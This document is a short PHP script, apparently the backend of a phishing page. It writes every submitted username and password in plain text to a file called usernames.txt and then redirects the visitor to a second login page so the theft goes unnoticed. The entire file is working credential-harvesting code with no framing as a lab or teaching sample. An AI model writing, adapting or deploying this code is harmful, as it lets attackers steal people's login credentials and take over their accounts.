<?php

file_put_contents("usernames.txt", "1 Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: login2.html');
exit();
